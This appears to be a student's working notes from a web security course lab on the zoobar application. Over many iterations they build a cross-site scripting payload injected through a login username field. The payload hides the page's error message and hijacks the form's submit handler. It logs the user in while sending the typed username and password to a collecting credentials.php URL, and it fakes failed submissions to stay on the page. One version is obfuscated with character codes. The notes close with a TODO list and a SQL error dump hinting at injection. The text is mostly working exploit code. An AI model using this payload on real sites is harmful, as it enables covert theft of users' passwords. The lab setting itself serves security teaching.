Starting points:

'' onclick='alert(document.cookie)' --> nothing
"" onclick=alert(document.cookie) --> ""
a onclick=alert(document.cookie) --> a



Better event since we cant assume the user will click on username since it has the focus by default
PROBLEM: event handler runs on every keystroke of input. We probably want event handler to run once.
I think I want event handler to change the DOM by adding something to the form to make a GET request to 
leak the password when form is submitted and also then log the user. Think blocking AJAX call.

'' oninput='alert(document.cookie)'


Better since this will execute when the username field loses focus. This will be done once presumably. 
Maybe can add some global variable check to avoid this happening twice.

'' onblur='alert(document.cookie)'


The event handler for the username field was only our entry point. We want to modify the form element to 
do what we want when submitted (ultimately, sending the password to us and logging the user in). The 
following sets an event handler on the form. 

document.forms[0].setAttribute('onsubmit', 'alert(document.cookie)')


Combining the entry point and the above we get

'' onblur='document.forms[0].setAttribute(\'onsubmit\', \'alert(document.cookie)\')'

Problem with escaping ': fix use technique from myspace paper:

String.fromCharCode(39,111,110,115,117,98,109,105,116,39) --> "'onsubmit'"

String.fromCharCode(39, 97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41, 39) --> "'alert(document.cookie)'"

A handy function to get the correct character encoding:

function strToCharCode(str){
  res = [];
  for(var i = 0; i < str.length; i++)
  {
    res[i] = str.charCodeAt(i);
  }
  return res;
}


'' onblur=document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116),String.fromCharCode(97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,99,111,111,107,105,101,41))

'' onblur='document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116), String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41))'

this both equivalent to 

'' onblur='document.forms[0].setAttribute("onsubmit", "alert(document.cookie)")'

and work


Now I got control of the form onsubmit event handler. Befor getting into that lets get rid of the "You must supply a password to log in." error message displayed when we redirect user to page. We do this with the onfocus element since the user field 
will be focused when the page is renderd, which means that that event will immediately trigger our handler and we will delete the message before user can notice.

'' onfocus='document.body.children[4].style.display = String.fromCharCode(110, 111, 110, 101)'

this does the trick of deleting that annoying message. Combining we get:

'' onfocus='document.body.children[4].style.display = String.fromCharCode(110, 111, 110, 101)' onblur='document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116), String.fromCharCode(97, 108, 101, 114, 116, 40, 100, 111, 99, 117, 109, 101, 110, 116, 46, 99, 111, 111, 107, 105, 101, 41))'

which is equivalent to 

'' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].setAttribute("onsubmit", "alert(document.cookie)")'



So recap, we managed to construct a string that when inputted in the username and submitted returns to the login page, 
leaves no trace of tampering, and sets an event listener for the onsubmit event for the login form. Now lets modify that
event listener to send us the credentials and log the user in.


Do an Ajax GET to send username/password:

xmlhttp = new XMLHttpRequest();
xmlhttp.onreadystatechange = xhrHandler;
xmlhttp.open('GET','http://localhost/credentials.php?username=user&password=pass',false);
xmlhttp.send();

function xhrHandler() {
  if (this.readyState != 4) {
      return;
  }
  if (this.status != 200) {
      return;
  }
  var status = this.status;
  var text = this.responseText;

  alert(status + ": " + text);
}

compact: 
function xhrHandler() { if (this.readyState != 4) { return; } if (this.status != 200) { return; } var status = this.status; var text = this.responseText; alert(status + ": " + text); }


This works for sending and confirming reponse for a bogus username/password pair. 

document.forms[0].setAttribute("onsubmit", "function xhrHandler() { if (this.readyState != 4) { return; } if (this.status != 200) { return; } var status = this.status; var text = this.responseText; alert(status + ': ' + text); } xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = xhrHandler; xmlhttp.open('GET','http://localhost/credentials.php?username=user&password=pass',false); xmlhttp.send();")



Next is to get the real username/password pair here:

username entered can be gotten by: document.forms[0].children[0].children[0].children[0].children[1].children[0].value
password entered can be gotten by: document.forms[0].children[0].children[0].children[1].children[1].children[0].value



This does the trick with the entered username and password:



Now we combine the Ajax with the trick to set the form onsubmit attr. We get:


'' onfocus='document.body.children[4].style.display = String.fromCharCode(110, 111, 110, 101)' onblur='document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116), String.fromCharCode(102, 117, 110, 99, 116, 105, 111, 110, 32, 120, 104, 114, 72, 97, 110, 100, 108, 101, 114, 40, 41, 32, 123, 32, 105, 102, 32, 40, 116, 104, 105, 115, 46, 114, 101, 97, 100, 121, 83, 116, 97, 116, 101, 32, 33, 61, 32, 52, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 59, 32, 125, 32, 105, 102, 32, 40, 116, 104, 105, 115, 46, 115, 116, 97, 116, 117, 115, 32, 33, 61, 32, 50, 48, 48, 41, 32, 123, 32, 114, 101, 116, 117, 114, 110, 59, 32, 125, 32, 118, 97, 114, 32, 115, 116, 97, 116, 117, 115, 32, 61, 32, 116, 104, 105, 115, 46, 115, 116, 97, 116, 117, 115, 59, 32, 118, 97, 114, 32, 116, 101, 120, 116, 32, 61, 32, 116, 104, 105, 115, 46, 114, 101, 115, 112, 111, 110, 115, 101, 84, 101, 120, 116, 59, 32, 97, 108, 101, 114, 116, 40, 115, 116, 97, 116, 117, 115, 32, 43, 32, 39, 58, 32, 39, 32, 43, 32, 116, 101, 120, 116, 41, 59, 32, 125, 32, 120, 109, 108, 104, 116, 116, 112, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 111, 110, 114, 101, 97, 100, 121, 115, 116, 97, 116, 101, 99, 104, 97, 110, 103, 101, 32, 61, 32, 120, 104, 114, 72, 97, 110, 100, 108, 101, 114, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 111, 112, 101, 110, 40, 39, 71, 69, 84, 39, 44, 39, 104, 116, 116, 112, 58, 47, 47, 108, 111, 99, 97, 108, 104, 111, 115, 116, 47, 99, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115, 46, 112, 104, 112, 63, 117, 115, 101, 114, 110, 97, 109, 101, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 32, 43, 32, 39, 38, 112, 97, 115, 115, 119, 111, 114, 100, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 44, 102, 97, 108, 115, 101, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 115, 101, 110, 100, 40, 41, 59))'


which is equivalent to 

'' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].setAttribute("onsubmit", "function xhrHandler() { if (this.readyState != 4) { return; } if (this.status != 200) { return; } var status = this.status; var text = this.responseText; alert(status + ': ' + text); } xmlhttp = new XMLHttpRequest(); xmlhttp.onreadystatechange = xhrHandler; xmlhttp.open('GET','http://localhost/credentials.php?username=' + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + '&password=' + document.forms[0].children[0].children[0].children[1].children[1].children[0].value,false); xmlhttp.send();")'


it works!!!




Stripping the AJAX handler.....

without the xmlhandler to notify of the HTTP response this becomes:

'' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].setAttribute("onsubmit", "xmlhttp = new XMLHttpRequest(); xmlhttp.open('GET','http://localhost/credentials.php?username=' + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + '&password=' + document.forms[0].children[0].children[0].children[1].children[1].children[0].value,false); xmlhttp.send();")'

which yields the payload:

'' onfocus='document.body.children[4].style.display = String.fromCharCode(110, 111, 110, 101)' onblur='document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116), String.fromCharCode(120, 109, 108, 104, 116, 116, 112, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 111, 112, 101, 110, 40, 39, 71, 69, 84, 39, 44, 39, 104, 116, 116, 112, 58, 47, 47, 108, 111, 99, 97, 108, 104, 111, 115, 116, 47, 99, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115, 46, 112, 104, 112, 63, 117, 115, 101, 114, 110, 97, 109, 101, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 32, 43, 32, 39, 38, 112, 97, 115, 115, 119, 111, 114, 100, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 44, 102, 97, 108, 115, 101, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 115, 101, 110, 100, 40, 41, 59))'




To zoobar.stanford.edu....

adjusted to zoobar.stanford.edu instead of localhost this yields:

'' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].setAttribute("onsubmit", "xmlhttp = new XMLHttpRequest(); xmlhttp.open('GET','http://zoobar.stanford.edu/credentials.php?username=' + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + '&password=' + document.forms[0].children[0].children[0].children[1].children[1].children[0].value,false); xmlhttp.send();")'

or equivalently:

'' onfocus='document.body.children[4].style.display = String.fromCharCode(110, 111, 110, 101)' onblur='document.forms[0].setAttribute(String.fromCharCode(111,110,115,117,98,109,105,116), String.fromCharCode(120, 109, 108, 104, 116, 116, 112, 32, 61, 32, 110, 101, 119, 32, 88, 77, 76, 72, 116, 116, 112, 82, 101, 113, 117, 101, 115, 116, 40, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 111, 112, 101, 110, 40, 39, 71, 69, 84, 39, 44, 39, 104, 116, 116, 112, 58, 47, 47, 122, 111, 111, 98, 97, 114, 46, 115, 116, 97, 110, 102, 111, 114, 100, 46, 101, 100, 117, 47, 99, 114, 101, 100, 101, 110, 116, 105, 97, 108, 115, 46, 112, 104, 112, 63, 117, 115, 101, 114, 110, 97, 109, 101, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 32, 43, 32, 39, 38, 112, 97, 115, 115, 119, 111, 114, 100, 61, 39, 32, 43, 32, 100, 111, 99, 117, 109, 101, 110, 116, 46, 102, 111, 114, 109, 115, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 49, 93, 46, 99, 104, 105, 108, 100, 114, 101, 110, 91, 48, 93, 46, 118, 97, 108, 117, 101, 44, 102, 97, 108, 115, 101, 41, 59, 32, 120, 109, 108, 104, 116, 116, 112, 46, 115, 101, 110, 100, 40, 41, 59))'




To quotes....

I just learned from Gil that I dont need to do the whole String.fromCharCode hack from MySpace. Apparently even if my double quotes get html encoded to &quot; if they are in a javascript context javascipt will decode them back before interpreting them. so lets try to write the above attacks in simple quote. Fixing a few quotes we get:

'' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].onsubmit = function() { xmlhttp = new XMLHttpRequest(); xmlhttp.open("GET","http://localhost/credentials.php?username=" + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + "&password=" + document.forms[0].children[0].children[0].children[1].children[1].children[0].value, false); xmlhttp.send(); }'

it works! The zoobar.stanford.edu version:

'' onfocus='document.body.children[4].style.display = "none"' onblur='document.forms[0].onsubmit = function() { xmlhttp = new XMLHttpRequest(); xmlhttp.open("GET","http://zoobar.stanford.edu/credentials.php?username=" + document.forms[0].children[0].children[0].children[0].children[1].children[0].value + "&password=" + document.forms[0].children[0].children[0].children[1].children[1].children[0].value, false); xmlhttp.send(); }'





Now lets do JS cleanup in the exploit. First lets put things in vars, and different lines...

'' 
onfocus='document.body.children[4].style.display = "none"' 
onblur='document.forms[0].onsubmit = function() { 
var file_url = "http://localhost/credentials.php";
var username_param = "username=" + document.forms[0].children[0].children[0].children[0].children[1].children[0].value; 
var password_param = "password=" + document.forms[0].children[0].children[0].children[1].children[1].children[0].value;
var full_url = file_url + "?" + username_param + "&" + password_param; 
var xmlhttp = new XMLHttpRequest(); 
xmlhttp.open("GET", full_url, false); 
xmlhttp.send(); }'



Now lets navigate the DOM by getElemByXXX functions instead of traversal...

'' 
onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";' 
onblur='var loginform = document.getElementsByName("loginform")[0]; 
loginform.onsubmit = function() 
{ 
var hostname = "localhost"; 
var credentials_url = "http://" + hostname + "/credentials.php"; 
var username = document.getElementsByName("login_username")[0].value; 
var password = document.getElementsByName("login_password")[0].value;
var query = "username=" + username + "&" + "password=" + password; 
var full_url = credentials_url + "?" + query;
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("GET", full_url, false); 
xmlhttp.send(); 
}'



zoobar.stanford.edu version:

'' 
onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";' 
onblur='var loginform = document.getElementsByName("loginform")[0]; 
loginform.onsubmit = function() 
{ 
var hostname = "zoobar.stanford.edu"; 
var credentials_url = "http://" + hostname + "/credentials.php"; 
var username = document.getElementsByName("login_username")[0].value; 
var password = document.getElementsByName("login_password")[0].value;
var query = "username=" + username + "&" + "password=" + password; 
var full_url = credentials_url + "?" + query;
var xmlhttp = new XMLHttpRequest();
xmlhttp.open("GET", full_url, false); 
xmlhttp.send(); 
}'



Now lets try to make it stick.... If user enters wrong password incorrectly we still stay with him until he gets it right.

This makes the handler work again. Submits the login in behalf of user with AJAX and prints out the response:

'' 
onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";' 
onblur='var loginform = document.getElementsByName("loginform")[0]; 
loginform.onsubmit = function() 
{ 
var xhrHandler = function () 
{ 
if (this.readyState != 4) { return; } 
if (this.status != 200) { return; } 
var el = document.createElement("div");
el.innerHTML = this.responseText;
var status = this.status; var text = this.responseText; 
alert(status + ": " + this.responseText); 
};
var hostname = "localhost"; 
var username = document.getElementsByName("login_username")[0].value; 
var password = document.getElementsByName("login_password")[0].value; 
var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in";

var login_url = "http://" + hostname + "/index.php";
var xmlhttp1 = new XMLHttpRequest();
xmlhttp1.open("POST", login_url, false);
xmlhttp1.setRequestHeader("Content-type", "application/x-www-form-urlencoded");
xmlhttp1.onreadystatechange = xhrHandler;
xmlhttp1.send(query);
};'



Next we check if the reponse was successfull or not by inspecting it for a footer with an error message (the profile page does not have a footer):

'' 
onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";' 
onblur='var loginform = document.getElementsByName("loginform")[0]; 
loginform.onsubmit = function() { 
   var xhrHandler = function () { 
      if (this.readyState != 4) { return; } 
      if (this.status != 200) { return; } 
      var el = document.createElement("div"); 
      el.innerHTML = this.responseText; 
      if (el.getElementsByClassName("footer").length > 0) { 
         var warningText = el.getElementsByClassName("footer")[0].textContent; 
         alert(warningText.length); 
         console.log("Warning: " + warningText + ". Length : " + warningText.length); 
      } 
      else{ 
         alert("Successfully loggedn in"); 
      } 
   }; 
   var hostname = "localhost"; 
   var username = document.getElementsByName("login_username")[0].value; 
   var password = document.getElementsByName("login_password")[0].value; 
   var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 

   var login_url = "http://" + hostname + "/index.php"; 
   var xmlhttp1 = new XMLHttpRequest(); 
   xmlhttp1.open("POST", login_url, false); 
   xmlhttp1.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
   xmlhttp1.onreadystatechange = xhrHandler; 
   xmlhttp1.send(query); 
};' 


Whoa!! lets get rid of the onblur event handler. Lets do everything on the onfocus for the username field. Why not?

'' 
onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";
         var loginform = document.getElementsByName("loginform")[0]; 
         loginform.onsubmit = function() { 
            var xhrHandler = function () { 
               if (this.readyState != 4) { return; } 
               if (this.status != 200) { return; } 
               var el = document.createElement("div"); 
               el.innerHTML = this.responseText; 
               if (el.getElementsByClassName("footer").length > 0) { 
                  var warningText = el.getElementsByClassName("footer")[0].textContent; 
                  alert(warningText.length); 
                  console.log("Warning: " + warningText + ". Length : " + warningText.length); 
               } 
               else{ 
                  alert("Successfully loggedn in"); 
               } 
            }; 
            var hostname = "localhost"; 
            var username = document.getElementsByName("login_username")[0].value; 
            var password = document.getElementsByName("login_password")[0].value; 
            var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 

            var login_url = "http://" + hostname + "/index.php"; 
            var xmlhttp1 = new XMLHttpRequest(); 
            xmlhttp1.open("POST", login_url, false); 
            xmlhttp1.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
            xmlhttp1.onreadystatechange = xhrHandler; 
            xmlhttp1.send(query); 
         };' 




Now lets work on the successful login case. In this case we should simply steal the password and let the user go through.


'' 
onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none";
         var loginform = document.getElementsByName("loginform")[0]; 
         loginform.onsubmit = function() { 
            var hostname = "localhost"; 
            var username = document.getElementsByName("login_username")[0].value; 
            var password = document.getElementsByName("login_password")[0].value; 
            var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 
            var login_url = "http://" + hostname + "/index.php";
            var steal_url = "http://" + hostname + "/credentials.php" + "?" + query;
                  
            var login_handler = function () { 
               if (this.readyState != 4) { return; } 
               if (this.status != 200) { return; } 
               
               var el = document.createElement("div"); 
               el.innerHTML = this.responseText; 
               
               if (el.getElementsByClassName("footer").length > 0) { 
                  var warningText = el.getElementsByClassName("footer")[0].textContent; 
                  alert(warningText.length); 
                  console.log("Warning: " + warningText + ". Length : " + warningText.length); 
               } 
               else{ 
                  var steal_request = new XMLHttpRequest();
                  steal_request.open("GET", steal_url, false); 
                  steal_request.send();  
               } 
            };     
             
            var login_request = new XMLHttpRequest(); 
            login_request.open("POST", login_url, false); 
            login_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
            login_request.onreadystatechange = login_handler; 
            login_request.send(query); 
         };'



That works!! Now lets handle the unsuccessfull login case. We want to somehow leave our code around for the next user input. 
I decided to accomplish this by aborting the form submission and make it look like it was submitted (display the error, 
etc.)


'' 
onfocus='var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none"; 
         var loginform = document.getElementsByName("loginform")[0]; 
         loginform.onsubmit = function() { 
            var hostname = "localhost"; 
            var username = document.getElementsByName("login_username")[0].value; 
            var password = document.getElementsByName("login_password")[0].value; 
            var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 
            var login_url = "http://" + hostname + "/index.php"; 
            var steal_url = "http://" + hostname + "/credentials.php" + "?" + query; 
                  
            var login_handler = function () { 
               if (this.readyState != 4) { return; } 
               if (this.status != 200) { return; } 
               
               var el = document.createElement("div"); 
               el.innerHTML = this.responseText; 
               
               if (el.getElementsByClassName("footer").length > 0) { 
                  login_successful = false; 
                  error_message = el.getElementsByClassName("footer")[0].textContent; 
                  header_text = el.getElementsByTagName("h1")[0].textContent; 
                  subheader_text = el.getElementsByTagName("h2")[0].textContent; 
               } 
               else{ 
                  var steal_request = new XMLHttpRequest(); 
                  steal_request.open("GET", steal_url, false); 
                  steal_request.send(); 
                  login_successful = true; 
               } 
            };     
             
            var login_request = new XMLHttpRequest(); 
            login_request.open("POST", login_url, false); 
            login_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
            login_request.onreadystatechange = login_handler; 
            login_request.send(query);
            
            if (!login_successful){ 
               document.getElementsByTagName("h1")[0].textContent = header_text; 
               document.getElementsByTagName("h2")[0].textContent = subheader_text; 
               document.getElementsByClassName("footer")[0].textContent = error_message; 
               document.getElementsByClassName("footer")[0]; warning.style.display = "block"; 
               return false; 
            } 
         };' 


That worked wonders. The UI changes to make the user think the form was submitted. There are a couple of quirks still regarding the event habdler that
erases the error message when the focus is on the username field. We need to make sure this only happens the first time. Lets iron those details out.


'' 
onfocus='if ( typeof(onFocusEventCount)=="undefined" ) { onFocusEventCount = 0; } 
         onFocusEventCount += 1; 
         
         if (onFocusEventCount == 1){ 
            var warning = document.getElementsByClassName("footer")[0]; warning.style.display = "none"; 
         } 

         var loginform = document.getElementsByName("loginform")[0]; 
         loginform.onsubmit = function() { 
            var hostname = "localhost"; 
            var username = document.getElementsByName("login_username")[0].value; 
            var password = document.getElementsByName("login_password")[0].value; 
            var query = "login_username=" + username + "&" + "login_password=" + password + "&submit_login=Log%20in"; 
            var login_url = "http://" + hostname + "/index.php"; 
            var steal_url = "http://" + hostname + "/credentials.php" + "?" + query; 
                  
            var login_handler = function () { 
               if (this.readyState != 4) { return; } 
               if (this.status != 200) { return; } 
               
               var el = document.createElement("div"); 
               el.innerHTML = this.responseText; 
               
               if (el.getElementsByClassName("footer").length > 0) { 
                  login_successful = false; 
                  error_message = el.getElementsByClassName("footer")[0].textContent; 
                  header_text = el.getElementsByTagName("h1")[0].textContent; 
                  subheader_text = el.getElementsByTagName("h2")[0].textContent; 
               } 
               else{ 
                  var steal_request = new XMLHttpRequest(); 
                  steal_request.open("GET", steal_url, false); 
                  steal_request.send(); 
                  login_successful = true; 
               } 
            };     
             
            var login_request = new XMLHttpRequest(); 
            login_request.open("POST", login_url, false); 
            login_request.setRequestHeader("Content-type", "application/x-www-form-urlencoded"); 
            login_request.onreadystatechange = login_handler; 
            login_request.send(query);
            
            if (!login_successful){ 
               document.getElementsByTagName("h1")[0].textContent = header_text; 
               document.getElementsByTagName("h2")[0].textContent = subheader_text; 
               document.getElementsByClassName("footer")[0].textContent = error_message; 
               document.getElementsByClassName("footer")[0]; warning.style.display = "block"; 
               return false; 
            } 
         };' 


lets leave it at that!



left to do:
 

// TODO: make it stick if user enters username and password wrong.
// TODO: take out the xhml handler to alert of response.
// TODO: now build the actual webpage that does the attack. This was only the payload......
// TODO: make attack resistant to user inputting incorrect username/password once and returning to the page again
// TODO: make cleaner the attack. There is a lot of DOM navigation that might be fragile. like document.forms[0].children[0].children[0].children[1].children[1].children[0].value for the password. 
// TODO: dont create global vars
// TODO: put global vars to avoid execution of event handlers twice
// TODO: chane localhost to zoobar.stanford.edu
// TODO: make AJAX call asynchronous?
// TODO: avoid quotes
// TODO: make DOM navigation simpler












Miscellaneous:

// can do SQL injection: see dump when entering a password

Php-Txt-Db-Access Error:
PHP Error: [8] Undefined offset: 0 [Line: 201] [File: /srv/http/txt-db-api/expression.php]

Php-Txt-Db-Access Error:
PHP Error: [8] Undefined offset: 1 [Line: 207] [File: /srv/http/txt-db-api/expression.php]

Php-Txt-Db-Access Error:
Column 'document.cookie' not found

Php-Txt-Db-Access Error:
Query 'SELECT Salt FROM Person WHERE Username = ''' onclick='alert(document.cookie)''' failed